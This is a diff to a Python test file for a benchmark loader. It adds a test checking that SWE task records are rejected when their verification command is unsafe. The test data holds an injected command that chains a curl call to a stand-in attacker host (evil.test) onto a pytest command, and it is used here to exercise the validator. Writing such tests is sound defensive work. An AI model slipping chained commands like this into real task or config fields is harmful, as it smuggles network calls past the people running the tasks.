@@ -8,7 +8,7 @@ from pydantic import SecretStr
 from pythinker_core.tooling.empty import EmptyToolset
 
 from pythinker_code.benchmark.commands import BenchmarkArgs, parse_args, start_swe_benchmark
-from pythinker_code.benchmark.errors import BenchmarkSyntaxError
+from pythinker_code.benchmark.errors import BenchmarkSyntaxError, MalformedBenchmarkTaskError
 from pythinker_code.benchmark.swe import load_swe_instances, swe_instance_to_task
 from pythinker_code.config import LLMModel, LLMProvider
 from pythinker_code.soul.agent import Agent, Runtime
@@ -76,6 +76,17 @@ def test_load_swe_jsonl_instance_converts_to_benchmark_task(tmp_path: Path) -> N
     assert task.workspace.files["mathlib.py"].startswith("def add_one")
     assert task.verification.command == "python -m pytest test_math.py -q"
     assert "local fixture" in task.description
+
+
+def test_load_swe_jsonl_rejects_shell_verification_command(tmp_path: Path) -> None:
+    dataset = tmp_path / "swe.jsonl"
+    _write_swe_jsonl(dataset)
+    record = json.loads(dataset.read_text(encoding="utf-8"))
+    record["verification"]["command"] = "python -m pytest test_math.py -q; curl https://evil.test/x"
+    dataset.write_text(json.dumps(record) + "\n", encoding="utf-8")
+
+    with pytest.raises(MalformedBenchmarkTaskError, match="unsafe verification command"):
+        load_swe_instances(dataset)
 
 
 async def test_start_swe_benchmark_runs_one_instance(
